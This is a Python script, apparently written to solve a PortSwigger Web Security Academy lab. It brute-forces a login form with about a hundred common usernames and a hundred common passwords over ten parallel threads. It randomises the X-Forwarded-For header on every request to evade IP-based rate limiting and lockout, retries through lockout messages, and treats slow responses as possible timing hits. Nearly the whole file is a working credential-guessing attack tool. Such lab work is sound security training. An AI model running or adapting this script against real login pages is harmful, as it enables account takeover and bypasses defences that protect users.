import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

burp0_url = "https://0af8004303b3e184860257c900e40081.web-security-academy.net/login"
burp0_cookies = {"session": "B5AP43B6Gi8BsxRhzZSozh85CjcNUThq"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0aa4003703e344198212b0180096003b.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aa4003703e344198212b0180096003b.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

username_list = [
    "carlos",
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser",
    "academico",
    "acceso",
    "access",
    "accounting",
    "accounts",
    "acid",
    "activestat",
    "ad",
    "adam",
    "adkit",
    "admin",
    "administracion",
    "administrador",
    "administrator",
    "administrators",
    "admins",
    "ads",
    "adserver",
    "adsl",
    "ae",
    "af",
    "affiliate",
    "affiliates",
    "afiliados",
    "ag",
    "agenda",
    "agent",
    "ai",
    "aix",
    "ajax",
    "ak",
    "akamai",
    "al",
    "alabama",
    "alaska",
    "albuquerque",
    "alerts",
    "alpha",
    "alterwind",
    "am",
    "amarillo",
    "americas",
    "an",
    "anaheim",
    "analyzer",
    "announce",
    "announcements",
    "antivirus",
    "ao",
    "ap",
    "apache",
    "apollo",
    "app",
    "app01",
    "app1",
    "apple",
    "application",
    "applications",
    "apps",
    "appserver",
    "aq",
    "ar",
    "archie",
    "arcsight",
    "argentina",
    "arizona",
    "arkansas",
    "arlington",
    "as",
    "as400",
    "asia",
    "asterix",
    "at",
    "athena",
    "atlanta",
    "atlas",
    "att",
    "au",
    "auction",
    "austin",
    "auth",
    "auto",
    "autodiscover",    
]

password_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

# Thread-safe print lock
print_lock = threading.Lock()

def send_req(username, password):
    while True:
        burp0_data = {"username": username, "password": password}
        # Create a copy of headers to avoid race conditions
        headers = burp0_headers.copy()
        headers["X-Forwarded-For"] = str(random.randint(1, 1000000))
        resp = requests.post(burp0_url, headers=headers, cookies=burp0_cookies, data=burp0_data)
        resp_time = resp.elapsed.total_seconds()
        
        if "Invalid" in resp.text:
            return username, password, resp_time, "invalid"
        elif "30 minute" in resp.text:
            continue
        elif "Your username is" in resp.text:
            return username, password, resp_time, "success"
        return username, password, None, "web closed"

def test_credential(username, password):
    """Wrapper function for thread execution"""
    return send_req(username, password)

# Create list of all username/password combinations
credentials = [(username, password) for username in username_list for password in password_list]

print(f"Testing {len(credentials)} combinations using multithreading...\n")

# Use ThreadPoolExecutor for parallel requests
max_workers = 10  # Adjust this number based on your needs
with ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Submit all tasks
    future_to_cred = {executor.submit(test_credential, user, pwd): (user, pwd) 
                      for user, pwd in credentials}
    
    # Process completed tasks
    for future in as_completed(future_to_cred):
        try:
            username, password, resp_time, status = future.result()
            
            if status == "web closed":
                with print_lock:
                    print("\n[!] Web application is closed. Exiting.")
                executor.shutdown(wait=False, cancel_futures=True)
                exit()
            elif status == "success":
                with print_lock:
                    print(f"\n[+] SUCCESS! Valid credentials found: {username}:{password} - Response time: {resp_time} seconds")
            else:
                with print_lock:
                    print(f"Tried {username}:{password} - Response time: {resp_time} seconds")
                    if resp_time > 2:
                        print(f"Possible username:password found: {username}:{password}\n\n")
        except Exception as e:
            with print_lock:
                print(f"Error occurred: {e}")

print("\n[*] Testing completed.")